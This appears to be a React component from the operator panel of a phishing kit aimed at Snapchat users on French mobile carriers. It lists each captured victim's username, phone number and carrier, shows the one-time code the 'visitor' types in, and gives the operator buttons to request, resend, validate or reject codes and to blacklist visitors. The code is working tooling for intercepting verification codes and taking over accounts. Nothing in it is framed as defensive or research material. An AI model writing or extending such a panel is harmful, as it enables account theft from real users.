import { useState } from "react";
import { motion } from "framer-motion";
import { Ban, Copy, Check } from "lucide-react";

const opColor = {
  SFR: { badge: "bg-red-500/10 text-red-400 border-red-500/25", btn: "bg-red-500 hover:bg-red-600 text-white", tint: "bg-red-500/10" },
  Bouygues: { badge: "bg-blue-500/10 text-blue-400 border-blue-500/25", btn: "bg-blue-500 hover:bg-blue-600 text-white", tint: "bg-blue-500/10" },
  Orange: { badge: "bg-orange-500/10 text-orange-400 border-orange-500/25", btn: "bg-orange-500 hover:bg-orange-600 text-white", tint: "bg-orange-500/10" },
};
const fallback = { badge: "bg-secondary/40 text-muted-foreground border-border", btn: "bg-primary hover:bg-primary/90 text-primary-foreground", tint: "bg-secondary/40" };

const formatPhone = (tel) => {
  const t = String(tel || "").replace(/\D/g, "");
  return t.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
};

function FieldRow({ label, value, copyValue, tint }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(String(copyValue ?? value ?? ""));
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {}
  };
  return (
    <div className={`rounded-xl px-3.5 py-2.5 ${tint || "bg-secondary/30"}`}>
      <div className="flex items-center justify-between gap-2">
        <div className="min-w-0">
          <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">{label}</p>
          <p className="text-sm font-semibold text-foreground mt-0.5 truncate font-mono">{value || "—"}</p>
        </div>
        {copyValue !== undefined && (
          <button
            onClick={copy}
            className="shrink-0 text-[11px] font-medium px-2.5 py-1 rounded-md bg-secondary/60 border border-border text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1"
          >
            {copied ? (
              <>
                <Check className="w-3 h-3" /> Copied
              </>
            ) : (
              <>
                <Copy className="w-3 h-3" /> Copy
              </>
            )}
          </button>
        )}
      </div>
    </div>
  );
}

export default function ClaimedActions({ submission, onAction, onBlacklist, busyKey }) {
  const sub = submission;
  const c = opColor[sub.operateur] || fallback;
  const hasCode = !!sub.received_code;

  const actions = [
    { id: "code_ready", label: "Send code (4)", cls: c.btn },
    { id: "code6", label: "Resend (6 digits)", cls: "bg-purple-500/10 text-purple-400 border border-purple-500/25 hover:bg-purple-500/20" },
    { id: "code6sfr", label: "Resend (SFR)", cls: "bg-red-500/10 text-red-400 border border-red-500/25 hover:bg-red-500/20" },
    { id: "code6orange", label: "Resend (Orange)", cls: "bg-orange-500/10 text-orange-400 border border-orange-500/25 hover:bg-orange-500/20" },
    { id: "valid", label: "Validate", cls: "bg-green-500/10 text-green-400 border border-green-500/25 hover:bg-green-500/20" },
    { id: "wrong", label: "Wrong number", cls: "bg-red-500/10 text-red-400 border border-red-500/25 hover:bg-red-500/20" },
    { id: "expired", label: "Code expired", cls: "bg-yellow-500/10 text-yellow-400 border border-yellow-500/25 hover:bg-yellow-500/20" },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-card border border-border rounded-2xl p-6 flex flex-col min-h-[60vh]"
    >
      <div className="flex items-center gap-2 mb-5">
        <span
          className={`text-[11px] font-semibold px-2.5 py-1 rounded-full border ${
            hasCode ? "border-primary/30 bg-primary/10 text-primary" : "border-border bg-secondary/40 text-muted-foreground"
          }`}
        >
          {hasCode ? "OTP submitted" : "Awaiting OTP"}
        </span>
        <span className={`text-[11px] font-semibold px-2.5 py-1 rounded-full border ${c.badge}`}>{sub.operateur}</span>
        <span className="ml-auto text-[11px] text-muted-foreground font-mono">#{sub.id.slice(-6)}</span>
      </div>

      <div className="flex flex-col gap-2.5">
        <FieldRow label="Snapchat user" value={sub.snapchat ? `@${sub.snapchat}` : "—"} copyValue={sub.snapchat ? `@${sub.snapchat}` : ""} />
        <FieldRow
          label="Phone number"
          value={formatPhone(sub.telephone)}
          copyValue={String(sub.telephone || "").replace(/\D/g, "")}
          tint="bg-green-500/10"
        />
        <FieldRow label="Operator" value={sub.operateur} tint={c.tint} />

        {hasCode ? (
          <div className="rounded-xl px-3.5 py-2.5 bg-purple-500/10">
            <div className="flex items-center justify-between gap-2">
              <div className="min-w-0">
                <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">OTP code</p>
                <p className="text-2xl font-bold text-foreground mt-0.5 font-mono tracking-[0.3em]">{sub.received_code}</p>
              </div>
              <CopyBtn value={sub.received_code} />
            </div>
            {sub.code_received_at && (
              <p className="text-[10px] text-muted-foreground mt-1.5">
                Received at{" "}
                {new Date(sub.code_received_at).toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" })}
              </p>
            )}
          </div>
        ) : (
          <div className="rounded-xl px-3.5 py-3 bg-purple-500/5 border border-dashed border-purple-500/20">
            <span className="text-[11px] text-purple-300/80">Waiting for the visitor to enter the OTP.</span>
          </div>
        )}
      </div>

      <div className="grid grid-cols-2 gap-2.5 mt-6">
        {actions.map((a) => (
          <button
            key={a.id}
            disabled={!!busyKey}
            onClick={() => onAction(a.id)}
            className={`text-xs font-semibold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5 ${a.cls}`}
          >
            {busyKey === a.id ? (
              <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin" />
            ) : (
              a.label
            )}
          </button>
        ))}
        <button
          disabled={!!busyKey}
          onClick={onBlacklist}
          className="col-span-2 bg-red-500/10 text-red-400 border border-red-500/25 hover:bg-red-500/20 text-xs font-semibold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
        >
          <Ban className="w-3.5 h-3.5" /> Instant blacklist
        </button>
      </div>
    </motion.div>
  );
}

function CopyBtn({ value }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(String(value ?? ""));
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {}
  };
  return (
    <button
      onClick={copy}
      className="shrink-0 text-[11px] font-medium px-2.5 py-1 rounded-md bg-secondary/60 border border-border text-muted-foreground hover:text-foreground transition-colors flex items-center gap-1"
    >
      {copied ? (
        <>
          <Check className="w-3 h-3" /> Copied
        </>
      ) : (
        <>
          <Copy className="w-3 h-3" /> Copy
        </>
      )}
    </button>
  );
}